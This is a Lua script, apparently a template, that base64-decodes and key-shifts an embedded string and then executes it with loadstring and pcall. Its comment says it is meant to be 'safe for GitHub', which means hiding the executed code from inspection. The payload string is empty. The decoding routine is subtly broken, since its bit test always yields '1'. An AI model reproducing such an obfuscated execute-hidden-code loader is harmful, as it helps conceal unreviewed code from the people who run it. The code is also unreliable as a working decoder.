-- Encrypted + base64 loader (safe for GitHub). Decrypts and executes the payload.
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f = '', (string.find(b, x)-1)
        for i=6,0,-1 do r = r .. (f%2^i - f%2^(i-1) >= 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d%d%d%d%d%d', function(c)
        local byte = 0
        for i=1,8 do byte = byte*2 + (c:sub(i,i) == '1' and 1 or 0) end
        return string.char(byte)
    end))
end

local enc = ""
local key = "Str1xKey"

local raw = decode(enc)
local out = {}
for i=1,#raw do
    local a = string.byte(raw, i)
    local k = string.byte(key, ((i-1) % #key) + 1)
    -- reverse of (orig + k) % 256 --> orig = (a - k) % 256
    local orig = (a - k) % 256
    out[i] = string.char(orig)
end

local payload = table.concat(out)

local exec = loadstring or load -- try both
if exec then
    local fn = exec(payload)
    if fn then pcall(fn) end
else
    error("No loadstring/load available in this environment.")
end
